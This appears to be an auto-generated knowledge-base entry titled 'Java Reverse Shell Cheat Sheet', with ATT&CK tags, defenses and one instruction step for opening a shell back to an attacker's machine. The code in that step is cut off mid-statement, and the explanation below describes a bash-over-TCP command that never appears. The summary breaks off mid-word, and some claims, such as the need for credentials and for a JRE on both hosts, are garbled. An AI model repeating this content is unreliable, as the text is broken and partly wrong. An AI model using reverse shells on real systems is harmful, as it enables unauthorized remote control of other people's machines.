---
id: b53ce71d-6d3b-4396-98e8-c13e27dfaf16
name: Java Reverse Shell Cheat Sheet
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:24.530372+00:00'
updated_at: '2023-04-10T20:25:28.799949+00:00'
tactics:
- '[[Command and Control|TA0011 - Command and Control]]'
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
techniques:
- '[[Remote Access Tools|T1219 - Remote Access Tools]]'
- '[[Web Service|T1102 - Web Service]]'
tags:
- '[[Java]]'
- '[[Reverse Shell]]'
- '[[Reverse Shell Cheat Sheet]]'
---

# Java Reverse Shell Cheat Sheet

## Summary

A Java reverse shell is a type of shell in which a user can establish a connection with a remote host and execute commands. This is useful for remote administration of a computer or for gaining access to a system. The Java reverse shell works by opening a socket connection to a remote host and send

## Description

# Description

A Java reverse shell is a type of shell in which a user can establish a connection with a remote host and execute commands. This is useful for remote administration of a computer or for gaining access to a system. The Java reverse shell works by opening a socket connection to a remote host and sending commands through that connection. It is a powerful tool for attackers who want to gain access to a system and execute commands remotely. From a technical perspective, the Java reverse shell uses the Java Runtime Environment (JRE) to execute commands on the remote host. From a business perspective, this tool can be used for remote administration of computers and servers, as well as for troubleshooting and debugging purposes.

## Requirements

1. Java Runtime Environment (JRE) installed on the local and remote host

1. Network access to the remote host

1. Authentication credentials for the remote host

## Defense

1. Use network segmentation to limit access to critical systems

1. Implement strong authentication mechanisms, such as multi-factor authentication

1. Monitor network traffic for suspicious activity, such as unexpected connections or data exfiltration

## Objectives

1. Establish a remote connection with a host

1. Execute commands on a remote host

1. Gain remote access to a system

# Instructions

1. To create a reverse shell, use this command. Replace the IP address and port number with the IP address and port number of the attacker's machine. This command will execute a bash shell on the target machine and connect it to the attacker's machine, allowing the attacker to execute commands on the target machine.

**Code**: [[Runtime r = Runtime.getRuntime();
Process p = r.ex]]

> This command uses the Java Runtime class to execute a bash shell on the target machine. The shell is connected to the attacker's machine using a TCP connection. The 'cat <&5' command reads data from the TCP connection and sends it to the shell. The 'while read line' loop reads commands from the shell and sends them back to the TCP connection. The '2>&5 >&5' redirects the standard output and standard error of the commands to the TCP connection.

## MITRE ATT&CK Mapping

### Tactics

- [[Command and Control|TA0011 - Command and Control]]
- [[Defense Evasion|TA0005 - Defense Evasion]]

### Techniques

- [[Remote Access Tools|T1219 - Remote Access Tools]]
- [[Web Service|T1102 - Web Service]]

## Tags

- [[Java]]
- [[Reverse Shell]]
- [[Reverse Shell Cheat Sheet]]
